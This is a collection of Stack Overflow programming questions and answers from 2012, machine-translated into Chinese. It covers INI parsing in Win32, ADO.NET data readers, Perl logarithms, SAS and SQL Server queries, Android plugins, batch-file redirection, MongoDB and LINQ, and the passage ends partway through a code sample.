> 标签：c++, windows, winapi, configuration, win32-process

我正在尝试读取具有内容的 c++ 中的 .init 配置文件。

> [IP地址]
> 
> IP地址=169.254.115.22
> 
> [扫描配置]
> 
> 扫描频率=2500
> 
> 扫描分辨率=2500
> 
> 起始角度=700000
> 
> 停止角=1100000

到目前为止，我已经使用此代码来读取数据。我的项目是 Unicode 字符集，因此在字符串值之前使用了 L。

```
 int iScanFreq =GetPrivateProfileInt(L"ScanConfiguration",L"Scanfrequency", 2500, L"filename.ini");
  int iScanRes =GetPrivateProfileInt(L"ScanConfiguration",L"ScanResolution", 2500, L"filename.ini");
  int iStartAngle =GetPrivateProfileInt(L"ScanConfiguration",L"StartAngle", -450000, L"filename.ini");
  int iStopAngle =GetPrivateProfileInt(L"ScanConfiguration",L"StopAngle", 2250000, L"filename.ini"); 
```

但我只得到变量中的默认值，而不是文件中的正确值。我还没有对注册表做任何事情。为了获得正确的值，我必须在注册表中做些什么..

任何建议都会有所帮助谢谢。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-20T02:57:04.453

想到了一个想法：GetPrivateProfileString 和朋友们对他们如何找到 INI 文件有点奇怪。除非您指定 INI 文件的路径（甚至像 一样简单`.\filename.ini`），否则他们假定该文件位于 Windows 目录中。这几乎肯定不是您想要的，并且可能会导致找不到文件，从而导致找不到默认值。

此外，不要指望这些函数提供完整的 Unicode 支持。[它们只是围绕 ANSI 文本的 Unicode 包装器。](http://blogs.msdn.com/b/oldnewthing/archive/2007/11/26/6523907.aspx)

# asp.net - 已经是与此命令关联的开放数据读取器。这怎么可能？

> ID：10239579
> 
> 赞同：1
> 
> 时间：2012-04-20T02:47:13.693
> 
> 标签：asp.net, sql-server, ado.net

我有以下课程：

```
public class Data
{
    static public SqlDataReader ExecutSql(string sql)
    {
        var cmd = new SqlCommand(sql, SqlCon.Conn);
        var data = cmd.ExecuteReader();
        return data;
    }
} 
```

它是从 asp.net 网页调用的，我收到错误消息：“已经有一个打开的 DataReader 与此命令关联，必须先关闭它。”

显然，我在执行数据读取器之前正在实例化一个新的 SqlCommand 行。我是 Web 开发的新手（我的背景是 WinForms），但即便如此，我仍然无法理解我如何已经拥有一个与刚刚创建的命令相关联的开放 DataReader？我可能理解这是否是多线程类型的问题，但我正在调试器中逐步执行代码并收到此错误。

有人想告诉我我在这里缺少什么吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T02:54:49.980

你之前有没有调用过这个方法？您的方法返回一个 SqlDataReader，我不确定它是否正确关闭。根据[msdn](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqldatareader.close.aspx)，

> 当您通过使用 SqlDataReader 以将关联的 SqlConnection 用于任何其他目的时，您必须显式调用 Close 方法。

我建议您从阅读器中读取数据并关闭阅读器并返回新类型（DataTable / DataSet 或填充属性的自定义类）

```
using(SqlCommand command =new SqlCommand(sql, SqlCon.Conn))
{
   SqlDataReader reader = command.ExecuteReader();
   while (reader.Read())
   {
     //Fill your object and then use that to return
   }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T06:09:19.603

您究竟何时调用 SqlDataReader ExecutSql(string sql) 方法？是在页面加载时吗？因为如果是这样，那么每次在页面上发生任何事件时，都会调用 asp.net 页面加载。为了防止这种情况，您可以使用以下内容：

```
if(!Page.IsPostBack)
{
    //call SqlDataReader ExecutSql(string sql)
} 
```

这将确保仅在打开页面加载时调用上述方法一次。如果由于任何事件而回发，则不会调用此方法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-21T00:00:21.023

您还可以在连接字符串中启用[MARS ：](http://msdn.microsoft.com/en-us/library/yf1a7f4f%28v=vs.80%29.aspx)

# perl - 错误：无法记录 -9.4351e+0.007

> ID：10239580
> 
> 赞同：0
> 
> 时间：2012-04-20T02:47:21.673
> 
> 标签：perl, logarithm

我正在使用 Perl 创建一个迷你搜索引擎。这样做时，我使用了一个以 10 为底的日志公式。但是对于某些值，我收到了一个错误：

无法记录 -9.4351e+0.007。

无法跟踪我从哪里得到这个错误。我只想忽略这个案例。如何在 Perl 中处理这个问题。查找以 10 为底的日志的子程序如下：

```
sub log10 {
my $n=shift;
return log($n)/log(10);
} 
```

所以可能我正在寻找一张支票，上面写着如果某某某值找不到日志。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-20T02:52:20.430

您不能记录负数。

有关详细信息，请参阅[Wolfram MathWorld 。](http://mathworld.wolfram.com/NaturalLogarithm.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-20T03:27:17.293

除了值为负之外，字符串`-9.4351e+0.007`不是有效数字，因为浮点常量的指数部分只能是整数。

您必须将字符串传递给您的`log10`函数，因为 Perl 不会抱怨这种格式的数字。

您需要查看这些值的来源，因为在调用您的函数之前出现了问题，即使对于那些可以正确传递的值，它也可能会给您不正确的结果`log`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-20T03:24:40.240

“ `ln y`”的意思是“找到等于的`x`地方”。`e^x``y`

`e`是一个正数（接近 2.17828），所以无论你`e`与自身相乘多少次，你永远不会得到一个负数。

您找不到负数的日志。

* * *

正如 Borodin 还指出的那样，`-9.4351e+0.007`Perl 不将其识别为数字。

```
>perl -wE"say 0+'-9.4351e+0.007'"
Argument "-9.4351e+0.007" isn't numeric in addition (+) at -e line 1.
-9.4351 
```

# sql - 子查询在连接两个子集时产生比预期更多的结果

> ID：10239581
> 
> 赞同：0
> 
> 时间：2012-04-20T02:47:22.803
> 
> 标签：sql, dataset, left-join, sas, proc-sql

在两个表上执行左外连接语句后，我可能会收到更多的 ID。

背景：我已经从较大的数据集中缩小了两个表。以下是我在从较大的数据集中进行选择后用来获取可能的 ID 的查询。我正在尝试根据 personID 将两个数据集连接在一起。我正在执行 LEFT JOIN，因为我想保留 smallset 表中的所有数据，同时将其与缩小数据表中的数据配对。

在对较大数据集的子集运行此查询时，我收到以下 ID：

```
select s.personID from st.smallerset as s;

41486
41490
41493
41496
 ... 
```

现在，在运行第二个查询时，我收到以下信息：

```
select r.* from st.secondlargedataset as r,
st.condition as h where r.personID=h.personID group by r.personID; 
```

我收到以下查询：

```
41544
41577
41595
41605
 ... 
```

到目前为止，一切都很好。一切都如预期的那样。但是，当我尝试加入这两个子集时运行下一个子查询时，会得到意想不到的结果。

```
select s.personID
from st.smallerset as s left join
(select r.* from st.secondlargedataset as r,
 st.condition as h where r.personID=h.personID group by r.personID) as v on 
s.personID=v.personID;

41485
41486
41489
41490
41493
41496
41510
41512
41513
41516 
```

此结果中包含的数据未包含在任一先前查询中。特别是 ID `41485`、`41489`等`41496`。我不知道为什么会出现这些 ID，因为当我将查询分解为单独的查询时，我得到了我需要的 ID。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T14:30:03.117

我认为您的问题可能与此查询有关：

```
select r.*
from st.secondlargedataset as r, st.condition as h
where r.personID=h.personID
group by r.personID; 
```

该`group by`语句在大多数 SQL 实现中是非法的，但 SAS 允许它（即使它毫无意义），并产生不可预测的结果。

尝试删除它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T02:56:49.210

尝试以下

`SELECT s.personID FROM st.smallerset AS s WHERE s.personID IN ( SELECT r.personID FROM st.secondlargedataset AS r, st.condition AS h WHERE r.personID = h.personID GROUP BY r.personID )`

或者

`SELECT s.personID FROM st.smallerset AS s WHERE s.personID IN ( SELECT r.personID FROM st.secondlargedataset AS r INNER JOIN st.condition AS h ON r.personID = h.personID GROUP BY r.personID )`

# sql-server - 如何比较 SQL Server 数据库并更新另一个数据库？

> ID：10239594
> 
> 赞同：1
> 
> 时间：2012-04-20T02:50:44.393
> 
> 标签：sql-server

我目前正在处理一个场景，即我有 2 个 SQL 数据库，我需要比较 2 个数据库中每个表中的数据变化。数据库之间具有相同的确切表，但是每个数据库中可能具有不同的数据。我遇到的第一个障碍是如何比较数据集，我面临的第二个挑战是一旦我确定了差异，我该怎么说，例如更新数据库 2 中可能存在于 1 中的数据丢失。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T03:47:39.700

为什么不使用 SQL 数据比较而不是重新发明轮子？它完全符合您的要求 - 比较两个数据库并编写将在任一方向同步的脚本。我为一家与他们的一些工具竞争的供应商工作，它仍然是我推荐的那个。

[http://www.red-gate.com/products/sql-development/sql-data-compare/](http://www.red-gate.com/products/sql-development/sql-data-compare/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-20T02:59:29.033

比较数据的一个强大命令是[**`EXCEPT`**](http://msdn.microsoft.com/en-us/library/ms188055.aspx). 有了这个，您只需执行以下操作即可比较具有相同结构的两个表：

```
SELECT * FROM Database1.dbo.Table
EXCEPT
SELECT * FROM Database2.dbo.Table 
```

这将为您提供 Database1 中存在但 Database2 中不存在的所有行，包括两者中存在但不同的行（因为它比较每一列）。然后您可以颠倒查询的顺序以检查另一个方向。

确定差异后，您可以使用`INSERT`或`UPDATE`将更改从一侧转移到另一侧。例如，假设您有一个主键字段`PK`，并且新行只进入 Database2，您可能会执行以下操作：

```
INSERT INTO Database1.dbo.Table
SELECT T2.*
FROM Database2.dbo.Table T2
LEFT JOIN Database1.dbo.Table T1 on T2.PK = T1.PK
WHERE T1.PK IS NULL -- insert rows that didn't match, i.e., are new 
```

实际使用的方法取决于这两个表是如何关联在一起的，如何识别匹配的行，以及更改的来源可能是什么。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-20T14:06:54.327

您还可以查看 Visual Studio 2010（Premium 及更高版本）中的数据比较功能吗？我用它来确保我所有环境（即开发、测试和生产）中的配置表是同步的。它让我的生活变得非常轻松。您可以选择要比较的表，可以选择要比较的列。不过，我还没有学会如何保存我的选择以备将来使用。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-20T15:49:12.030

您可以使用 SQL Compare 执行此操作，这对于开发来说也非常有用，但如果您想按计划执行此操作，更好的解决方案可能是 Simego 的 Data Sync Studio。我知道它可以在 i3 iMac（bootcamp）上的 16GB 上进行大约 100m（30 列宽）的行比较。实际上，每侧 1m -> 20m 行是很舒服的。它使用列存储引擎。

在这种情况下，下载、安装和测试该场景只需要几分钟。

我希望这会有所帮助，因为我总是寻找问号来弄清楚某人在问什么。

# android - Android应用程序的插件架构？

> ID：10239596
> 
> 赞同：41
> 
> 时间：2012-04-20T02:50:49.370
> 
> 标签：android, dalvik, layout-inflater, android-inflate, dex

**这个问题已经转移到[https://softwarerecs.stackexchange.com/questions/27841/plugins-architecture-for-an-android-app](https://softwarerecs.stackexchange.com/questions/27841/plugins-architecture-for-an-android-app)**

* * *

[我想为开源应用程序](https://groups.google.com/forum/#!topic/anki-android/VJYB4dxi64E)实现一个插件系统，因为它已经变得非常大，具有许多只有少数用户需要的功能。发布不同的应用程序不是一个好的解决方案，因为用户 A 想要 feature7 和 feature24，而 userB 想要 feature39 和 feature24。

我在哪里可以找到一个插件架构的好例子？

这是我希望插件能够执行的操作：

*   重新定义特定屏幕的布局（[加载压缩的 XML](https://stackoverflow.com/questions/8197844/inflate-xml-file-from-internal-memory)？）
*   重新定义一个类的方法（[load dex class](https://stackoverflow.com/questions/3022454/how-to-load-a-java-class-dynamically-on-android-dalvik) ?, [AOP](https://stackoverflow.com/questions/3759232/aspect-oriented-programming-in-android) ?）

例如，其中一个插件必须在特定屏幕上添加一个按钮，单击此按钮会增加应用程序数据库中的一个值。据我所知，这对于内容提供者和意图是不可行的。

我想避免使核心应用程序的代码变得复杂，到处都有大量的钩子。

插件的形式可以是 SD 卡上的文件、应用程序或其他任何东西。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-12T09:48:17.460

我已经完成了一个框架，它与 Robo-guice 类似，并具有一些主要的 IoC 功能。（减少加载视图/服务等的样板代码......）

但是，我认为解决您的问题的核心是能够加载单独的 APK“插件”文件，其中包括“res”以及`<layouts>.xml`文件。该`<layouts>.xml`文件可以由该 APK 中的类独立扩展。也就是说，您可以将 CustomView （它自己膨胀`<layout>.xml`）加载到原始/父应用程序中。所有这些都是在父应用 APK 不知道 UI 是如何在插件 APK 中膨胀的情况下完成的。

我的意思的示例：我有一个映射应用程序，框架将动态扫描与“附加功能”插件的“合同”匹配的已安装 APK，并将特定于它的 UI 作为浮动面板加载到应用程序的视图中.

我会说 Android 的插件框架是可行的，因为 Android 拥有大部分（如果不是全部）必要的内置 API 来实现这一点。

这些是您在 Android 插件开发领域的朋友：

1.  PackageManager（扫描安装包，又名插件）
2.  `DexClassLoader`（`ClassNotFoundException`如果您不使用正确的`ClassLoader`顺便说一句，将会很痛苦）
3.  Java 反射

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2015-06-27T02:12:07.137

> 我在哪里可以找到一个插件架构的好例子？

来自 Google 的 Roman Nurik 在他的开源应用[dash clock](https://github.com/romannurik/dashclock)中实现了一个不错的插件框架。插件本身是扩展[API中的](https://github.com/romannurik/dashclock/wiki/API)[DashClockExtension](https://github.com/romannurik/dashclock/blob/master/api/src/main/java/com/google/android/apps/dashclock/api/DashClockExtension.java)类的服务，并安装为具有自己资源的完全独立的 APK 文件。通过 AIDL 定义通信协议需要做很多工作，但它既干净又好用，而且效果很好。

> 其中一个插件必须在特定屏幕上添加一个按钮，单击此按钮会增加应用程序数据库中的一个值。

可以被插件修改的主布局部分需要由核心应用程序预先定义，并通过通信协议公开。插件应该可以扩展任意布局，并将其发送到主应用程序，这可以将其放在它自己布局的预分配区域内。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-04-28T12:12:34.430

如果你只是想增加模块化，我建议使用依赖注入容器，例如[PicoContainer](http://picocontainer.org/)、[Guice](http://code.google.com/p/google-guice/)或[Spring](http://www.springsource.org/spring-android)。

如果你想要一个轻量级的插件架构，那么选择[Java Plugin Framework (JPF)](http://jpf.sourceforge.net/)。

它允许您定义可以由您的模块实现的扩展点。插件框架的主要工作是提供一种方法来捆绑这些模块（作为 jar），这些模块由核心应用程序动态找到并作为扩展点的实现给出。

# xamarin.ios - MonoTouch：Xcode 4.3.2 - 兼容版本

> ID：10239598
> 
> 赞同：1
> 
> 时间：2012-04-20T02:51:03.050
> 
> 标签：xamarin.ios, monodevelop

使用新发布的 Xcode 4.3.2 需要什么版本的 MonoTouch 看来 xCode 现在正在使用不同的部署模型。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T07:15:51.470

[MonoTouch 5.2.5](http://docs.xamarin.com/ios/releases/MonoTouch_5/MonoTouch_5.2#MonoTouch_5.2.5)中引入了 Xcode 4.3 支持。

# jquery - 将图标添加到 jQuery 按钮

> ID：10239602
> 
> 赞同：-3
> 
> 时间：2012-04-20T02:51:31.960
> 
> 标签：jquery, button

请为我提供一个在不使用 javascript 的情况下向 jquery UI 按钮添加图标的示例？我的意思是使用主题或直接在 HMTL 页面中添加图标？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T03:07:52.437

如果您只是跳到[官方的 jQuery UI 主题文档](http://jqueryui.com/docs/Theming/API)，那么有很多关于如何做到这一点的描述性信息。向下滚动到图标。

# java - 休眠和 Sybase 错误

> ID：10239604
> 
> 赞同：0
> 
> 时间：2012-04-20T02:51:59.633
> 
> 标签：java, hibernate, sybase, cross-join

我在我的项目中使用了hibernate和sybase，hibernate生成的sql使用了交叉连接，但是sybase不支持交叉连接，谁能告诉我如何避免交叉连接？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T03:56:18.260

有一个关于这个问题的[Hibernate Bugreport 。](https://hibernate.onjira.com/browse/HHH-5356)

一种可能的解决方法可能是使用`Sybase11Dialect`或`SybaseASE15Dialect`

# xcode4.3 - “_OBJC_CLASS_$_”，引用自：xcode 4.3.2 中的错误

> ID：10239605
> 
> 赞同：0
> 
> 时间：2012-04-20T02:52:00.650
> 
> 标签：xcode4.3, ios5.1

所以今天我遇到了一个大问题。如附件代码所示，我在 xcode 4.3.2 上遇到了涉及我的视图控制器的问题：

架构 i386 的未定义符号：“_OBJC_CLASS_$_SecondViewController”，引用自：Birdflix_ProViewController.o 中的 objc-class-ref “_OBJC_CLASS_$_ThirdViewController”，引用自：Birdflix_ProViewController.o 中的 objc-class-ref “_OBJC_CLASS_$_FourthViewController”，引用自：Birdflix_ProViewController.o“_OBJC_CLASS_$_Author”中的 objc-class-ref，引用自：Birdflix_ProViewController.o 中的 objc-class-ref ld：找不到架构 i386 的符号 clang：错误：链接器命令失败，退出代码 1 （使用 -v 查看调用）

我注意到这些错误仅在我编写将我的视图控制器链接到其他类的 IBActions 时才会出现。如果我删除 IBActions，错误就会消失。任何帮助表示赞赏。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T04:54:23.767

请将您的`SecondViewController.m`or `SecondViewController.mm`, `ThirdViewController.m`/ `.mm`, `FourthViewController.m`/ `.mm`, `Birdflix_ProViewController.m`/`.mm`文件添加到编译源以成功构建。

要将文件添加到编译源，请执行以下操作

1.  xcode中的构建阶段
2.  选择编译源
3.  按+按钮添加`.m`/`.mm`文件

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-14T09:36:38.853

我认为您添加了一些其他静态库。而且您还没有将它链接到您的项目目标中。拳头清理所有目标并再次构建，然后检查项目设置栏是否正确显示了活动构建目标的模拟器版本。希望它会有所帮助。

# android - 在 Android / PhoneGap 上运行的 jQueryMobile 拒绝 .load / .ajax

> ID：10239608
> 
> 赞同：4
> 
> 时间：2012-04-20T02:52:15.500
> 
> 标签：android, jquery, jquery-mobile, cordova

我真的很讨厌问我觉得以前被问过一千次的问题。这是我觉得其他人一定遇到过的问题之一，[但是](https://stackoverflow.com/questions/7539079/jquery-load-function-does-not-work-under-phonegap) [在](https://stackoverflow.com/questions/7539079/jquery-load-function-does-not-work-under-phonegap) [搜索了](https://stackoverflow.com/questions/9418818/phonegap-jqm-problems-with-local-files-on-android) [stack](https://stackoverflow.com/questions/9728371/jquery-load-local-files-dynamically) [overflow](https://stackoverflow.com/questions/8650268/android-phonegap-and-jquerymobile-integration)后，没有一个假定的解决方案对我有用，所以我一定做错了什么.....

我有一个非常简单的应用程序设置。index.htm 和 terms.htm。test.htm 中有一些文本数据。我在加载内容`$.support.cors = true;`后`$.mobile.allowCrossDomainPages = true;`的适当时间进行了设置。

起初我尝试使用将terms.htm的数据加载到索引中的一个元素中`$('#elementid').load('terms.htm');`（测试和索引都在同一个根/assets/www/目录中，我的webview加载索引oncreate）但绝对没有发生任何事情。所以我选择尝试 .ajax，这样我至少可以收到一条错误消息，而我得到的只是“错误”。当然，可以在 DroidGap 上使用 JQ 加载本地文本资源吗？

```
$('#header').load('terms.htm');
$.ajax({
    type:"GET",
    timeout:10000,
    async: false,
    url: "terms.htm",
    success: function(data) {
        $('#header').html(data);
    },
    error: function(xhr,msg){
           alert( msg);
       }
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T15:56:47.003

请参阅此[链接](http://groups.google.com/group/phonegap/browse_thread/thread/2bb5e3a1f2770f43/765c3ab7802b884c?lnk=raot)。我有同样的问题，这解决了它。另外，我认为他们在 1.6.0 中修复了它，但我现在在 iOS 上看到与 PhoneGap 1.6.1 相同的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T03:18:09.107

我不是 100% 确定，但我认为这是 ICS 4.0.3 的问题。在 4.0.2 上，ajax 似乎工作得很好，但对我来说，在 4.0.3 上也没有 ajax。像你一样，我已经尝试了一切，但没有任何工作..

顺便说一句，我正在使用 PhoneGap。Ajax 在标准浏览器中运行良好，但在 PhoneGap 应用程序中却不行。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-21T20:55:03.830

这只是一个长镜头，但您说“*我在加载内容后的适当时间同时设置了 $.support.cors = true; 和 $.mobile.allowCrossDomainPages = true;。* ”。jQuery 移动文档说[您必须在加载 JQM*之前*](http://jquerymobile.com/test/docs/api/globalconfig.html)设置全局配置：

> 因为 mobileinit 事件会立即触发，所以您需要在加载 jQuery Mobile 之前绑定您的事件处理程序。按以下顺序链接到您的 JavaScript 文件：

```
<script src="jquery.js"></script>
<script src="custom-scripting.js"></script>
<script src="jquery-mobile.js"></script> 
```

在您的情况下，这将是：

```
<script src="jquery.js"></script>
<script>
    $(document).bind("mobileinit", function(){
        $.support.cors = true;
        $.mobile.allowCrossDomainPages = true;
    });
</script>
<script src="jquery-mobile.js"></script> 
```

就像我说的，只是一个猜测......

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-20T07:21:45.893

**如果**您在 Chrome 中运行您的应用程序 **然后**您需要禁用网络安全并启用加载本地文件请参阅[使用 PhoneGap 和 jQuery 的跨域请求不起作用](https://stackoverflow.com/questions/10173427/cross-domain-requests-using-phonegap-and-jquery-doesnt-work/10177420#comment13075146_10177420) **如果**Safari 或模拟器或网络服务器 **则**它应该工作

# batch-file - 批处理 - 如何从批处理脚本本身重定向标准错误和标准输出？

> ID：10239610
> 
> 赞同：3
> 
> 时间：2012-04-20T02:52:25.297
> 
> 标签：batch-file

在 Unix shell 脚本中，可以从内部脚本本身重定向标准错误和标准输出，如下所示：

```
#!/bin/ksh
# script_name: test.sh
export AUTO_LOGFILE=`basename $0 .sh`.log
# stdout and stderr Redirection. This will save the old stdout on FD 3, and the old stderr on FD 4.
exec 3>&0 4>&1 >>$AUTO_LOGFILE 2>&1
echo "Hello World"
# The above echo will be printed to test.log 
```

实际上，test.sh 可以简单地执行为：

```
test.sh 
```

代替：

```
test.sh >> test.log 2>&1 
```

我正在尝试在批处理脚本中做类似的事情。我的批处理代码如下：

```
@echo off & setlocal enableextensions enabledelayedexpansion
REM script_name=test.bat
set AUTO_LOGFILE=%~n0.log
REM How to do the stdout and stderr redirection from within the script itself here? 
```

如何从批处理脚本本身重定向标准错误和标准输出？我更感兴趣的是将此 unix shell 脚本语句转换为等效的批处理代码：

```
exec 3>&0 4>&1 >>$AUTO_LOGFILE 2>&1 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-21T17:03:40.513

下面的**test.bat**批处理文件在*功能上等同*于您的 Unix 脚本，即它将所有标准输出发送到日志文件并将错误输出发送到屏幕：

```
@echo off
if defined reEntry goto reEntry
set reEntry=TRUE

set AUTO_LOGFILE=%~N0.log
rem stdout Redirection. Leave stderr as is.

"%~F0" %* >>%AUTO_LOGFILE%

:reEntry
set reEntry=
echo "Hello World"
rem The above echo will be printed to test.log
rem and error messages will be printed to the screen:
verify badparam 
```

***附录：***

我以为 OP 想*将 stdout 与 stderr 分开*以在屏幕上查看错误消息，但也许我误解了他。要将 stdout 和 stderr 都发送到文件，请使用下面的行，如 dbenham 在他的评论中指出的那样：

```
"%~F0" %* >>%AUTO_LOGFILE% 2>&1 
```

或者以上面评论中已经建议的更简单的方式：

```
@echo off
set AUTO_LOGFILE=%~N0.log
rem stdout and stderr Redirection.

call :Main %* >>%AUTO_LOGFILE% 2>&1
goto :EOF

:Main
echo "Hello World"
rem The above echo will be printed to test.log 
```

但是，如果目的是将错误消息与正常输出*区分开*来，则可以通过以下技巧*在同一屏幕中完成：*

```
"%~F0" %* 2>&1 1>&3 | findstr /N /A:4E "^" 
```

这样，错误消息就会出现在红色背景上的黄色行号之前。这种方法可以在多种情况下直接使用；例如，在任何编程语言源程序的编译中：

```
anycompiler %1 2>&1 1>&3 | findstr /N /A:4E "^" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T08:02:38.953

将行括在括号中

```
(
  REM How to do the stdout redirection from within the script itself here?
  ECHO is this redirected?
  ECHO yes it is
) >out.txt 
```

# mongodb - Mongo 提交名称更改未更新索引

> ID：10239611
> 
> 赞同：1
> 
> 时间：2012-04-20T02:52:33.817
> 
> 标签：mongodb, indexing, rename

虽然我理解外键约束对于 NoSql 数据库没有意义，但如果它允许我重命名字段，它是否不应该确保它更新索引？ [http://www.mongodb.org/display/DOCS/Updating#Updating-%24rename](http://www.mongodb.org/display/DOCS/Updating#Updating-%24rename)

```
{ $rename : { old_field_name : new_field_name } } 
```

但如果我有

```
db.mycollections.ensureIndex({old_field_name:1}); 
```

如果索引自动更新不是很好吗？

是不是因为 system.indexes 只是另一个表，并且这样的自动更新意味着某种外键约束，所以索引更新没有完成？还是我错过了某些标志？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T03:18:51.567

它不这样做。

您的问题的答案*“如果索引自动更新不是很好吗？”* 是，*“不，不是真的”*。

如果您认为重命名字段是一个好主意，您可以同时自己添加新索引。您可能需要在代码中进行许多其他更改以反映字段的重命名（查询、更新、map reduce 操作……），那么您为什么认为它应该将索引重新创建作为应该发生的事情？自动执行一项非常罕见的操作，而这只是您需要手动执行的*众多操作中的一件事？*

如果您关心此功能，请去请求它，10Gen 对建议的反应非常好，但如果答案是*“为什么这很重要？” ，我不会感到惊讶。*

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T05:24:09.600

引用 Mike O'Brien 的话：

$rename 运算符类似于在单个原子操作中执行 $set/$unset。对于需要取值并将其移动到另一个字段的情况，这是一种快捷方式，无需分两步进行（一个获取字段的值，另一个设置新的值）。

Doing a $rename does mean the data is changing. If I use $rename to rename a field named "x" to "y", but the field named "y" already existed in the document, the old value for "y" is overwritten, and the field "x" will no longer exist anymore. If either "x" or "y" is indexed, then the operation will update those indexes to reflect the final values resulting from the operation. The same applies when using rename to move a field from within an embedded document up to the top level (e.g. renaming "a.b" to "c") or vice versa.

The behavior suggested in the SO question (i.e., renaming a field maintains the relationship between the field it was moved to and its value in the index) then things can get really confusing and make it difficult to reason about what the "correct" expected behavior is for certain operations. For example, if I create an index on field "A" in a collection, rename "A" to "B" in one of the documents, and then do things like: update({"A" : }, {"$set":{"B":}}) // find a document where A= and set its value of B to update({"B" : }, {"$set":{"A":}}) // find a document where B= and set its value of A to

Should these be equivalent? In general, having the database maintain indexes across a collection by field name is a design decision that keeps behavior predictable and simple.

# android - 如何在一定时间内更改 Button 的背景，然后在 Android 应用程序上变回

> ID：10239615
> 
> 赞同：0
> 
> 时间：2012-04-20T02:53:07.670
> 
> 标签：android

我正在输入一个程序，我需要在一段时间内更改按钮的背景，比如 1 秒，然后它会变回原始状态。我知道如何设置背景，只是不知道如何让它更新 UI。我很确定我需要使用处理程序，但即使在进行研究之后，我也不清楚它们应该如何实现。请赐教。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T03:15:47.470

我认为这很简单并且会起作用

```
 private void startthread() {
anihandler = new Handler() {

    @Override
    public void handleMessage(Message msg) {
        super.handleMessage(msg);

        updatestatusalternate();
    }

};
aniThread = new Thread() {
    public void run() {
    sleep(1000);
                    anihandler.sendMessage(anihandler
                            .obtainMessage());

    }
};
aniThread.start();
}

   private void updatestatusalternate() {
    if(updatestatusflag)
    {
        //chnge your background resource here
        updatestatusflag=false;
    }
    else
    {
                   //chnge your background resource here
        updatestatusflag=true;
    }

} 
```

# c# - Linq：不允许在查询中显式构造实体类型

> ID：10239617
> 
> 赞同：2
> 
> 时间：2012-04-20T02:53:27.730
> 
> 标签：c#, linq

我已经用谷歌搜索了这个错误并在这里阅读了一些关于堆栈溢出的帖子，但我仍然不明白这里的问题是什么。我理解“英语”，但不理解程序化推理。为什么我可以这样做：

```
 public void FillRegister(ItemMovementRegister register, IDateRange imqp)
        {
            var f = from detail in this.Context.ItemMovements
                    where (detail.MovementDate >= imqp.StartDate) &&
                            (detail.MovementDate <= imqp.EndDate)
                    orderby detail.MovementDate descending
                    select new ItemMovement(detail.SourceSystemId,
                                            (ItemMovementKind)detail.MovementKind,
                                            detail.MovementDate.DateTime,
                                            detail.UniversalMovementKey,
                                            detail.UniversalMaterialItemKey,
                                            ((detail.SourceDocumentRef != null) ? detail.SourceDocumentRef.Trim() : string.Empty),
                                            ((detail.SourceComment != null) ? detail.SourceComment.Trim().Replace("Sale: ", "").Substring(0, 20) : string.Empty),
                                            detail.ActualDeltaQty)
                        {
                            MovementKindName = detail.MovementKindName.Trim()
                        };
            register.AddRange(f.ToList<ItemMovement>());
        } 
```

但不是这个：

```
public void FillRegister(ItemMovementRegister register, IDateRange imqp)
        {
            try
            {
                var f = from detail in this.Context.ShippingDocumentDetails
                        join header in this.Context.ShippingDocuments on detail.ClientOrderNumber equals header.ClientOrderNumber
                        where (header.DateOrdered >= imqp.StartDate)
                         && (header.DateOrdered <= imqp.EndDate)
                        orderby header.DateOrdered descending
                        select new ItemMovement(long.Parse(ConfigurationManager.AppSettings["PickedOrderSourceSystem"]),
                            ItemMovementKind.Picked,
                            ((header.DateOrdered.HasValue) ? header.DateOrdered.Value : new DateTime(1900, 1, 1)),
                             UniversalItemMovementConverter.GetMovementKeyFromShippingDocument(header.ClientOrderNumber),
                            detail.ProductCode,
                            header.ClientOrderNumber,
                            string.Empty,
                            ((detail.QuantityDelivered.HasValue) ? detail.QuantityDelivered.Value : 0)) { };
                List<ItemMovement> ms = f.ToList<ItemMovement>(); // Fails here
                this.UpdateItemMovements(ms);
                register.AddRange(ms);
            }
            catch (Exception ex)
            {
                throw new DALException("void FillItemMovements(ItemMovementRegister register, IDateRange imqp) failed :" + ex.Message, ex);
            }
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T03:42:56.443

我对这样的结构有更好的运气：

```
var ms = (from detail in this.Context.ShippingDocumentDetails
                    join header in this.Context.ShippingDocuments on detail.ClientOrderNumber equals header.ClientOrderNumber
                    where (header.DateOrdered >= imqp.StartDate)
                     && (header.DateOrdered <= imqp.EndDate)
                    orderby header.DateOrdered descending
                    select new ItemMovement(long.Parse(ConfigurationManager.AppSettings["PickedOrderSourceSystem"]),
                        ItemMovementKind.Picked,
